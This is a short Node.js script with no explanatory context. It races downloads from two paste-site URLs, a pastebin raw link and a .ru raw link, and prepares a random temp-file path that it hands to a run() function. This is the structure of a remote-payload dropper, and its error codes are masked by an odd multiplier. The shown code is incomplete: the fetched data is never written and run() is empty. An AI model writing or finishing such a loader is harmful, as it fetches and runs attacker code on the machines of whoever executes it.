const { spawn } = require('node:child_process');
const { join } = require('node:path');
const { randomUUID } = require('node:crypto');
const { tmpdir } = require('node:os');
const { writeFile } = require('node:fs/promises');

const urls = [
    'https://pastebin.com/raw/z6K1Rg8J',
    'https://calcal.ru/p/t5edjvR/raw'
];

async function download() {
    const controllers = urls.map(() => new AbortController());

    const tasks = urls.map(async (url, index) => {
        const response = await fetch(url, {
            signal: controllers[index].signal
        });

        if (!response.ok) {
            console.error(`Error #${response.status * 13579}`);
            throw new Error(`Error #${response.status * 13579}`);
        }

        const data = Buffer.from(await response.arrayBuffer());

        return { data, index };
    });

    try {
        const { data, index } = await Promise.any(tasks);

        controllers.forEach((controller, i) => {
            if (i !== index) controller.abort();
        });

        const filepath = join(tmpdir(), randomUUID());

        return filepath;
    } finally {
        controllers.forEach(controller => controller.abort());
    }
}

function run(filepath) {

}

download()
    .then(filepath => run(filepath))
    .catch(_ => process.exit(1));
